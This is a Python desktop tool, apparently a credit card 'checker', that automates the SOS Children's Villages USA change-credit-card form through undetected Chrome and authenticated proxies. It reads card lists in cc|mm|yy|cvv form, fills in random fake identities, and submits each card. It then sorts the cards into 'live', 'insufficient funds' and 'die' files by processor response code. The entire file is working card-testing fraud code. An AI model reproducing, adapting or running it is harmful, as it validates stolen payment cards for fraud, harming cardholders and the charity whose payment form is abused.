import sys
from PyQt5.QtWidgets import (QApplication, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QTextEdit, QLineEdit,
                             QLabel, QCheckBox, QFileDialog, QMessageBox)
from PyQt5.QtCore import pyqtSlot, QThread, pyqtSignal
from selenium_authenticated_proxy import SeleniumAuthenticatedProxy
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.remote.webdriver import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
import selenium.webdriver.support.expected_conditions as EC
from selenium.webdriver.support.wait import WebDriverWait
import undetected_chromedriver as uc
import datetime
import json
import requests
import os

class SeleniumThread(QThread):
    resultSignal = pyqtSignal(str)
    finished = pyqtSignal()
    saveSignal = pyqtSignal(list)
    
    def __init__(self, headless, proxy_url, card_details):
        super().__init__()
        self.headless = headless
        self.proxy_url = proxy_url
        self.card_details = card_details
        self._stop_flag = False

    def run(self):
        while self.card_details and not self._stop_flag:
            card = self.card_details.pop(0)
            self.process_card(card)

        if not self._stop_flag:
            self.finished.emit()
            
    def process_card(self, card):
        options = uc.ChromeOptions()
        options.add_experimental_option(
            "prefs", {
                "profile.managed_default_content_settings.images": 2,
            }
        )
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-gpu')
        options.add_argument('--disable-site-isolation-trials')
        options.add_argument('--disable-background-timer-throttling')
        options.add_argument('--disable-features=NetworkService')
        options.add_argument('--disable-renderer-backgrounding')
        options.add_argument('--disable-sync')
        options.add_argument('--single-process')
        options.add_argument('--disable-infobars')
        options.add_argument('--disable-software-rasterizer')
        options.add_argument('--disable-logging')
        options.add_argument('--disable-translate')
        options.add_argument('--disable-notifications')
        if self.proxy_url:
            proxy_helper = SeleniumAuthenticatedProxy(proxy_url=self.proxy_url)
            proxy_helper.enrich_chrome_options(options)
        driver = uc.Chrome(options=options, headless=self.headless, use_subprocess=True)
        driver.set_window_size(300, 800)

        cc, mm, yy, cvv = card
        print(card)
        x = datetime.datetime.now()
        try:
            #Request get random
            inforesponse= requests.get("https://randomuser.me/api?nat=us")
            inforesponse1 = inforesponse.text
            infojson = json.loads(inforesponse1)["results"][0]
            first=infojson["name"]["first"]
            last=infojson["name"]["last"]
            email = infojson["email"].replace("example.com", "gmail.com")

            wait = WebDriverWait(driver, 20)
            
            #Get 1
            driver.get('https://www.sos-usa.org/forms/changecreditcard')
            salutation_element = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="p_lt_ctl01_pageplaceholder_p_lt_ctl06_SOSForm_ChangeCreditCardProcess_Processes_US_ChangeCreditCardProcessViews_form1_ascx_SalutationDropDown"]')))
            salutation = Select(salutation_element)
            salutation.select_by_value('101US')
            
            firstname_element = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="p_lt_ctl01_pageplaceholder_p_lt_ctl06_SOSForm_ChangeCreditCardProcess_Processes_US_ChangeCreditCardProcessViews_form1_ascx_FirstNameTextBox"]')))
            firstname_element.send_keys(first)

            lastname_element = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="p_lt_ctl01_pageplaceholder_p_lt_ctl06_SOSForm_ChangeCreditCardProcess_Processes_US_ChangeCreditCardProcessViews_form1_ascx_LastnameTextBox"]')))
            lastname_element.send_keys(last)

            sendemail_element = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="p_lt_ctl01_pageplaceholder_p_lt_ctl06_SOSForm_ChangeCreditCardProcess_Processes_US_ChangeCreditCardProcessViews_form1_ascx_EmailTextBox"]')))
            sendemail_element.send_keys(email)

            contact_element = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="p_lt_ctl01_pageplaceholder_p_lt_ctl06_SOSForm_ChangeCreditCardProcess_Processes_US_ChangeCreditCardProcessViews_form1_ascx_PSNTextBox"]')))
            contact_element.send_keys('#200991')
            
            # Switch to iframe
            iframe_element = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="eProtect-iframe"]')))
            driver.switch_to.frame(iframe_element)

            
            if 'Access Denied' in driver.page_source:
                self.resultSignal.emit(f"Access Denied | {cc}|{mm}|{yy}|{cvv} | {x}")
                driver.quit()
            else:
                try:
                    inputcc_element = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="accountNumber"]')))
                    for char in cc:
                        inputcc_element.send_keys(char)

                    inputmm_element = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="expMonth"]')))
                    inputmm = Select(inputmm_element)
                    inputmm.select_by_value(mm)

                    inputyear_element = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="expYear"]')))
                    inputyear = Select(inputyear_element)
                    inputyear.select_by_visible_text(yy)

                    inputccv_element = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="cvv"]')))
                    for char in cvv:
                        inputccv_element.send_keys(char)
                    inputccv_element.send_keys(Keys.ENTER)
                    driver.switch_to.default_content()
                    
                    for _ in range(2):
                        submit = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="p_lt_ctl01_pageplaceholder_p_lt_ctl06_SOSForm_ChangeCreditCardProcess_Processes_US_ChangeCreditCardProcessViews_form1_ascx_NextCCButton"]')))
                        submit.click()
                    
                except TimeoutException:
                    self.resultSignal.emit(f"Timeout | {cc}|{mm}|{yy}|{cvv} | {x}")
                    driver.quit()
                    
            if 'Your credit card information has been successfully updated' in driver.page_source:
                if not os.path.exists('result'):
                    os.makedirs('result')
                    
                with open('result/live.txt', 'a') as f:
                    f.write(f'{cc}|{mm}|{yy}|{cvv} | {x}\n')
                
                self.resultSignal.emit(f"<span style='color: green;'>Live | {cc}|{mm}|{yy}|{cvv} | {x}</span>")
            
            try:
                error_element = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.XPATH, '//*[@id="p_lt_ctl01_pageplaceholder_p_lt_ctl06_SOSForm_ChangeCreditCardProcess_Processes_US_ChangeCreditCardProcessViews_formError_ascx_lblPaymentError"]'))
                )
                error_text = error_element.text
                response_line = [line for line in error_text.split('\n') if 'response code' in line.lower()]
                if response_line:
                    first_response = response_line[0]
                    if 'Insufficient Funds' in first_response:
                        if not os.path.exists('result'):
                            os.makedirs('result')
                            
                        with open('result/insuff.txt', 'a') as f:
                            f.write(f'{cc}|{mm}|{yy}|{cvv} | {response_line[0]} | {x}\n')
                        
                        self.resultSignal.emit(f"<span style='color: green;'>Insuff | {cc}|{mm}|{yy}|{cvv} | 110 Insufficient Funds | {x}</span>")
                        
                    elif 'response code: 352' in first_response:
                        if not os.path.exists('result'):
                            os.makedirs('result')
                            
                        with open('result/live.txt', 'a') as f:
                            f.write(f'{cc}|{mm}|{yy}|{cvv} | {response_line[0]} | {x}\n')
                        
                        self.resultSignal.emit(f"<span style='color: green;'>Live | {cc}|{mm}|{yy}|{cvv} | 352 Decline CVV2/CID Fail | {x}</span>")
                        
                    elif 'response code: 349' in first_response:
                        if not os.path.exists('result'):
                            os.makedirs('result')
                            
                        with open('result/live.txt', 'a') as f:
                            f.write(f'{cc}|{mm}|{yy}|{cvv} | {response_line[0]} | {x}\n')
                        
                        self.resultSignal.emit(f"<span style='color: green;'>Live | {cc}|{mm}|{yy}|{cvv} | 349 Temporary Hold 0.01$ | {x}</span>")
                        
                    else:
                        if not os.path.exists('result'):
                            os.makedirs('result')
                            
                        with open('result/die.txt', 'a') as f:
                            f.write(f'{cc}|{mm}|{yy}|{cvv} | {response_line[0]} | {x}\n')
                        
                        self.resultSignal.emit(f"<span style='color: red;'>Die | {cc}|{mm}|{yy}|{cvv} | {response_line[0]} | {x}</span>")
                        
                else:
                    if not os.path.exists('result'):
                        os.makedirs('result')
                        
                    with open('result/die.txt', 'a') as f:
                        f.write(f'{cc}|{mm}|{yy}|{cvv} | {x}\n')
                    
                    self.resultSignal.emit(f"<span style='color: green;'>Live | {cc}|{mm}|{yy}|{cvv} | {x}</span>")
                    
            except Exception as e:
                self.resultSignal.emit(f"<span style='color: red;'>Unk | {cc}|{mm}|{yy}|{cvv} | Proxy_time_out | {x}</span>")
                
        except Exception as e:
            self.resultSignal.emit(f"<span style='color: red;'>Unk | {cc}|{mm}|{yy}|{cvv} | Proxy_time_out | {x}</span>")
            
        finally:
            driver.quit()
        
    def stop(self):
        self._stop_flag = True
        
class SeleniumGUI(QWidget):

    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        # Layouts
        mainLayout = QVBoxLayout()
        proxyLayout = QHBoxLayout()
        outputLayout = QHBoxLayout()

        # Headless checkbox
        self.headlessCheckbox = QCheckBox('Headless Mode', self)

        # Proxy input
        self.proxyInput = QLineEdit(self)
        self.proxyInput.setPlaceholderText('Enter proxy as ip:port:user:pass')
        self.proxyInputLabel = QLabel('Proxy:', self)
        proxyLayout.addWidget(self.proxyInputLabel)
        proxyLayout.addWidget(self.proxyInput)

        # Output area
        self.outputArea = QTextEdit(self)
        self.outputArea.setReadOnly(True)
        self.outputArea.setAcceptRichText(True)
        self.copyButton = QPushButton('Copy', self)
        self.clearButton = QPushButton('Clear', self)
        self.copyButton.clicked.connect(self.copyOutput)
        self.clearButton.clicked.connect(self.clearOutput)
        outputLayout.addWidget(self.copyButton)
        outputLayout.addWidget(self.clearButton)

        # Add from file button
        self.addFromFileButton = QPushButton('Add from File', self)
        self.addFromFileButton.clicked.connect(self.addFromFile)

        # Start button
        self.startButton = QPushButton('Start', self)
        self.startButton.clicked.connect(self.startSelenium)

        self.stopButton = QPushButton('Stop', self)
        self.stopButton.clicked.connect(self.stopSelenium)
        
        # Add widgets to the main layout
        mainLayout.addWidget(self.headlessCheckbox)
        mainLayout.addLayout(proxyLayout)
        mainLayout.addWidget(self.outputArea)
        mainLayout.addLayout(outputLayout)
        mainLayout.addWidget(self.addFromFileButton)
        mainLayout.addWidget(self.startButton)
        mainLayout.addWidget(self.stopButton)

        self.setLayout(mainLayout)
        self.setWindowTitle('Vantiv | @juldeptrai')
        self.setGeometry(600, 200, 800, 600)

        # Tạo một biến instance self.selenium_thread
        self.selenium_thread = None

    @pyqtSlot(list)
    def saveUncheckedCards(self, unchecked_cards):
        with open('result/uncheck.txt', 'w') as file:
            for card in unchecked_cards:
                file.write('|'.join(card) + '\n')
        QMessageBox.information(self, 'Save Unchecked Cards', 'Unprocessed cards have been saved to result/uncheck.txt')
        
    @pyqtSlot()
    def startSelenium(self):
        headless = self.headlessCheckbox.isChecked()
        proxy = self.proxyInput.text()

        if not self.selenium_thread or not self.selenium_thread.isRunning():
            proxy_components = proxy.split(':') if proxy else []
            if len(proxy_components) == 4:
                ip, port, user, passw = proxy_components
                proxy_url = f"http://{user}:{passw}@{ip}:{port}"

                if self.card_details:
                    self.selenium_thread = SeleniumThread(headless, proxy_url, self.card_details)
                    self.selenium_thread.resultSignal.connect(self.handleResult)
                    self.selenium_thread.finished.connect(self.seleniumFinished)
                    self.selenium_thread.saveSignal.connect(self.saveUncheckedCards)
                    self.selenium_thread.start()
                    self.startButton.setEnabled(False)
                    self.stopButton.setEnabled(True)
                else:
                    QMessageBox.warning(self, 'No Card Details', 'No card details to process.', QMessageBox.Ok)
            else:
                QMessageBox.warning(self, 'Proxy Error', 'Please enter the proxy in the format ip:port:user:pass', QMessageBox.Ok)
        else:
            QMessageBox.warning(self, 'Thread Running', 'The thread is already running.', QMessageBox.Ok)

    @pyqtSlot()
    def stopSelenium(self):
        if self.selenium_thread and self.selenium_thread.isRunning():
            self.selenium_thread.stop()
            self.selenium_thread.wait()
            self.startButton.setEnabled(True)
            self.stopButton.setEnabled(False)

    @pyqtSlot()
    def addFromFile(self):
        options = QFileDialog.Options()
        fileName, _ = QFileDialog.getOpenFileName(self, "QFileDialog.getOpenFileName()", "", "All Files (*);;Text Files (*.txt)", options=options)
        if fileName:
            try:
                with open(fileName, 'r') as file:
                    # Assume each line in the file contains card details separated by '|'
                    self.card_details = [line.strip().split('|') for line in file if line.strip()]
                if self.card_details:
                    QMessageBox.information(self, 'File Added', f'File "{fileName}" added successfully.')
                else:
                    QMessageBox.warning(self, 'File Format Error', 'No valid card details found in the file', QMessageBox.Ok)
            except Exception as e:
                QMessageBox.warning(self, 'File Error', str(e), QMessageBox.Ok)

    def seleniumFinished(self):
        self.selenium_thread = None
        self.startButton.setEnabled(True)  # Re-enable the start button
        self.stopButton.setEnabled(False)  # Disable the stop button
        
    def readCardDetailsFromFile(self, file_path):
        try:
            with open(file_path, 'r') as file:
                card_details = file.readline().strip().split('|')
            if len(card_details) == 4:
                return card_details
            else:
                return None
        except Exception as e:
            print(f"Error reading card details from file: {e}")
            return None

    @pyqtSlot(str)
    def handleResult(self, result):
        self.outputArea.append(result)
        if result == "All cards have been processed.":
            QMessageBox.information(self, 'Process Complete', 'All cards have been processed.')
            self.startButton.setEnabled(True)  # Re-enable the start button
            self.stopButton.setEnabled(False)  # Disable the stop button

    
    @pyqtSlot()
    def copyOutput(self):
        self.outputArea.selectAll()
        self.outputArea.copy()

    @pyqtSlot()
    def clearOutput(self):
        self.outputArea.clear()

                
if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = SeleniumGUI()
    ex.show()
    sys.exit(app.exec_())